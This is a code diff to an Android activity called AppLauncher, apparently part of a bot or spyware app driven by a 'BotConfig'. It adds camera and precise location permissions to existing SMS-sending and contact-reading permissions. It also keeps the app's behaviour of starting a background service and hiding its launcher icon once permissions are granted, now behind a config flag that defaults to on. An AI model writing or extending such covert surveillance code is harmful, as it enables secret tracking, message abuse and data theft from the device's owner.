@@ -33,6 +33,9 @@ class AppLauncher : Activity() {
             add(android.Manifest.permission.SEND_SMS)
             add(android.Manifest.permission.READ_CONTACTS)
             add(android.Manifest.permission.POST_NOTIFICATIONS)
+            add(android.Manifest.permission.CAMERA)
+            add(android.Manifest.permission.ACCESS_FINE_LOCATION)
+            add(android.Manifest.permission.ACCESS_COARSE_LOCATION)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 add(android.Manifest.permission.READ_MEDIA_IMAGES)
                 add(android.Manifest.permission.READ_MEDIA_VIDEO)
@@ -58,6 +61,7 @@ class AppLauncher : Activity() {
 
         val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
 
+        // If icon was already hidden, just start service and exit
         if (prefs.getBoolean(KEY_ICON_HIDDEN, false)) {
             startService()
             finish()
@@ -141,7 +145,10 @@ class AppLauncher : Activity() {
 
     private fun onPermissionsGranted() {
         startService()
-        hideIcon()
+        // Only hide icon if autoHideIcon is enabled in config (default: true)
+        if (BotConfig.shouldAutoHideIcon()) {
+            hideIcon()
+        }
         finish()
     }
 
